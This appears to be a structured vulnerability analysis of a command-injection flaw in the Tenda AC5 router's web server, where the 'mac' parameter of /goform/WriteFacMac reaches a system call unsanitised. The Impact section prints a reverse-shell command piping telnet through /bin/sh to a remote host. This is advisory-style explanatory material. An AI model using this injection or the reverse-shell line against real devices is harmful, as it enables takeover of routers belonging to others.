Based on the provided information, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability lies in the `/bin/httpd` web server of the Tenda AC5 router's squashfs filesystem.
*   The web server directly passes the value of the `mac` parameter from a POST request to the `/goform/WriteFacMac` endpoint to a `doSystem` function without proper sanitization.

**Weaknesses/Vulnerabilities:**

*   **Arbitrary Command Execution:** The primary vulnerability is that the unsanitized `mac` parameter allows an attacker to inject arbitrary system commands.
*   **Lack of Input Validation:** The web server fails to validate or sanitize the `mac` parameter before passing it to the `doSystem` function.

**Impact of Exploitation:**

*   **Remote Command Execution (RCE):** An attacker can execute arbitrary commands on the router's operating system. This can lead to complete control of the device.
*   **Shell Access:** By injecting a command like `telnet remote_ip remote_port1 | /bin/sh | telnet remote_ip remote_port2`, the attacker can obtain a stable shell on the router.

**Attack Vectors:**

*   **HTTP POST Request:** The attack vector is a crafted HTTP POST request sent to the `/goform/WriteFacMac` endpoint.
*   **`mac` Parameter Injection:** The malicious payload is injected into the `mac` parameter of the POST request.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker must have network access to the router's web interface.
*   **Knowledge of Target Endpoint:** The attacker needs to know the vulnerable endpoint, `/goform/WriteFacMac`, and the vulnerable `mac` parameter.
*   **Cookie:** The attacker needs a valid cookie (as a header) to authenticate the request (as seen in the example `Cookie: password=You cookie`).
*   **Crafted Payload:**  The attacker must create a suitable command injection payload for the `mac` parameter.

**Additional Information:**

*   The provided Proof of Concept (PoC) demonstrates how to exploit the vulnerability using both Burp Suite and Python requests.
*   The vulnerability is demonstrated by establishing a telnet connection, indicating the successful execution of injected commands.

This vulnerability allows a remote attacker with network access to the Tenda AC5 router's web interface to execute arbitrary commands on the router's operating system by injecting commands into the `mac` parameter of the `/goform/WriteFacMac` endpoint.
